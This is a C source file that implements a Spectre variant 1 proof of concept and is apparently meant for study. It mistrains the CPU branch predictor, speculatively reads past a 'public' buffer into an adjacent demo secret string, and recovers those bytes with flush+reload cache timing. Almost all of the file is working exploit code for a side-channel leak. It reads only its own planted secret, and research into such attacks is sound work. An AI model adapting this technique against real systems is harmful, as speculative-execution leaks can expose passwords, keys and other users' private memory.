#include <stdio.h>
#include <time.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define CACHE_HIT   100
#define CL_SIZE     64          //CACHE LINE SIZE
#define N_PAGES     256

#define REPETITIONS 1000
#define N_TRAINING  10
#define SECRET_SIZE 9
#define SECRET      "mysecret"
#define BUF         "public"

int BUF_SIZE __attribute__((aligned(CL_SIZE))) = 7;
cp_t* flush_reload_arr __attribute__((aligned(CL_SIZE)));

/*
 * Variables required in cache:
 *  index
 *  BUF
 *
 * Variables requried in mem:
 *  BUF_SIZE
 *
 * Training:    index=0
 * Attack:      index={iterate through SECRET}
 */
void victim_func(int index) {

    //flush bound value
    flush(&BUF_SIZE);
    cpuid();

    //access (possibly out of bounds)
    if (index < BUF_SIZE) {
        unsigned char x = BUF[index];
        volatile cp_t cp = flush_reload_arr[x];
    }
}

int* prepare(int secret_index) {

    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr(flush_reload_arr, N_PAGES);

    //Access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses = N_TRAINING + 1;
    int parameters[n_accesses];
    for(int i = 0; i < n_accesses; i++) parameters[i] = 0;
    parameters[n_accesses-1] = secret_index;

    //Misstrain branch predictor, access out of bounds on last call
    for(int i = 0; i < n_accesses; i++) {
        victim_func(parameters[i]);

        cpuid();
        //flush hits from training phase (all but last access)
        if(i < n_accesses-1) {
            cpuid();
            flush_arr(flush_reload_arr, N_PAGES);
        }
        cpuid();
    }

    //make sure previous loop finishes execution
    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT);
    free_flush_reload(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char* argv[]) {

    printf("SECRET \t%p\tsize = %d\nBUF  \t%p\tsize = %d\nBUF[%d] \t%p\n",
           &SECRET, SECRET_SIZE, &BUF, BUF_SIZE, BUF_SIZE, &BUF[BUF_SIZE]);

    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    clock_t start2 = clock();

    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(BUF_SIZE + s);
            cpuid();
        }
    }

    clock_t end2 = clock();
    double measured_time = ((double)(end2 - start2))/CLOCKS_PER_SEC;

    print_results(results, REPETITIONS, SECRET, SECRET_SIZE, N_PAGES, CACHE_HIT, measured_time);

    free_results(results, REPETITIONS, SECRET_SIZE);

    return 0;
}